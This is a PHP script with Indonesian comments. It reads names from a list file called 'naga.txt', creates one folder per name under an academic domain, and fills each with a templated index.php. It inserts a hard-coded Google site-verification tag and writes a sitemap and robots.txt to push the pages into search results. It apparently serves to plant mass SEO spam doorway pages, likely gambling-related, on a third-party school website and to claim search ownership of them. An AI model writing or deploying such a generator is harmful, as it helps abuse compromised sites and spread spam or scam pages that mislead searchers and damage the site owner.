<?php
// Aktifkan error reporting untuk debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Define base URL for the site
// PASTIKAN URL INI SESUAI DENGAN ALAMAT SITUS ANDA
$base_url = 'https://cantik-rpl.bhamada.ac.id/'; 

// Fungsi untuk membuat file index.php berdasarkan template
function buat_index_file($nama_folder, $template_konten, $base_url, $google_site_verification_meta) {
    // Ganti {{ BRAND }} dengan nama folder dalam huruf besar (capslock)
    $konten_index = str_replace('{{ BRAND }}', strtoupper(htmlspecialchars($nama_folder)), $template_konten);

    // Ganti {{ URL }} dengan URL lengkap (base URL + nama folder)
    $url_folder = $base_url . $nama_folder . '/index.php';
    $konten_index = str_replace('{{ URL }}', htmlspecialchars($url_folder), $konten_index);

    // Tambahkan meta tag Google Search Console ke dalam tag <head>
    // Cari posisi penutupan tag </head>
    $head_end_tag = '</head>';
    $pos = strpos($konten_index, $head_end_tag);

    if ($pos !== false) {
        // Sisipkan meta tag sebelum penutupan tag </head>
        $konten_index = substr_replace($konten_index, $google_site_verification_meta . "\n    ", $pos, 0);
    }

    // Menulis konten ke file index.php
    file_put_contents($nama_folder . '/index.php', $konten_index);
}

// Baca daftar folder dari file naga.txt
$daftar_folder = file('naga.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// Periksa jika file naga.txt berhasil dibaca
if ($daftar_folder === false) {
    die('Gagal membaca file naga.txt');
}

// Baca konten dari file template.html
$template_file = 'template.html';
if (!file_exists($template_file)) {
    die('File template.html tidak ditemukan.');
}

$template_konten = file_get_contents($template_file);
if ($template_konten === false) {
    die('Gagal membaca konten dari file template.html.');
}

// Meta tag Google Search Console yang diperbarui
// Pastikan content="" ini sesuai dengan meta tag verifikasi Google Search Console Anda
$google_site_verification_meta = '<meta name="google-site-verification" content="MwwiuNAtGDn0IpM4Bt6Uw5Ia3QU9kmU31Y_V0775h-g" />';

// Membuat folder dan file index.php untuk setiap nama folder dalam daftar
foreach ($daftar_folder as $folder) {
    // Ubah nama folder menjadi huruf kecil
    $folder = strtolower(trim($folder));

    // Buat folder jika belum ada
    if (!file_exists($folder)) {
        mkdir($folder, 0755, true);
    }

    // Buat file index.php di dalam folder tersebut dengan nama folder dalam huruf besar dan URL lengkap
    buat_index_file($folder, $template_konten, $base_url, $google_site_verification_meta);
}

// Membuat sitemap.xml
$sitemap_content = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
$sitemap_content .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";

// Tambahkan setiap URL yang telah dibuat
foreach ($daftar_folder as $folder) {
    // Ubah nama folder menjadi huruf kecil untuk keperluan URL
    $folder = strtolower(trim($folder));
    
    $sitemap_content .= '    <url>' . "\n";
    $sitemap_content .= '        <loc>' . htmlspecialchars($base_url . $folder . '/index.php') . '</loc>' . "\n";
    $sitemap_content .= '    </url>' . "\n";
}

$sitemap_content .= '</urlset>';

// Menyimpan konten ke file sitemap.xml
file_put_contents('sitemap.xml', $sitemap_content);

// Membuat robots.txt
$robots_content = "User-agent: *\n";
$robots_content .= "Allow: /\n";  // Mengizinkan semua halaman di-crawl
$robots_content .= "Sitemap: " . $base_url . "sitemap.xml\n";  // Menyertakan URL sitemap

// Menyimpan konten ke file robots.txt
file_put_contents('robots.txt', $robots_content);

echo "Folder, file index.php, sitemap.xml, dan robots.txt berhasil dibuat.";
?>
